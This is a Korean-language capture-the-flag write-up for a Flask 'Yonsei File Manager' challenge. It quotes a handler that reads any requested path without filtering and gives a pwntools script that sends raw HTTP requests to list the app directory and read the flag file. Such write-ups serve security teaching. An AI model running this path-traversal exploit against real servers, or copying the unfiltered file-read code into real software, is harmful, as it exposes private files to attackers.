# Yonsei File Manager

## Vulnerability
### Path traversal
+ 페이지를 둘러보다 보면 url path == directory path 임을 알 수 있다.
+ Description 에서 flask 앱 임을 명시하고 있으므로 소스코드의 파일 명이 `app.py`일 것이라고 게싱할 수 있다.
> `/app.py` 로 요청을 보내면 소스코드를 확인할 수 있다.
app.py
```python
    try:
        lists = list_files(CUR_PATH.joinpath(directory))
    except NotADirectoryError:
        with open(CUR_PATH.joinpath(directory)) as f:
            contents = f.read()
        return Response(contents)
```
+ 디렉토리이면 파일을 리스팅해주고 파일이면 읽어서 리스폰스로 준다
+ path에 대한 별다른 필터링이 없다.
> `/.`으로 요청을 보내면 소스 폴더의 목록을 확인할 수 있다.
+ 일반적인 브라우저에서는 요청 경로에 `.`이 있을 경우 필터링 된다.
> raw http 요청을 보낸다.

## Exploit Code
```python
from pwn import *

host = '127.0.0.1'
port = 8080

r = remote(host, port)

def ready(s, **f):
    return s.format(**f).replace('\n','\r\n').encode('utf-8')

def receive(r):
    res = ''
    while True:
        try:
            res += r.recv().decode('utf-8')
        except EOFError:
            break
    return res


if __name__=="__main__":
    r.send(ready("""GET /. HTTP/1.1
    Host: {host}
    User-Agent: hacker

    """, host=host))

    res = receive(r)

    flag_name = res.split('<div class="file">')[4].split('./')[1].split('">')[0]
    print(flag_name)

    r = remote(host, port)
    r.send(ready("""GET /{path} HTTP/1.1
    Host: {host}
    User-Agent: hacker

    """, path=flag_name, host=host))

    flag = receive(r).split('\r\n\r\n')[1]
    print(flag)
```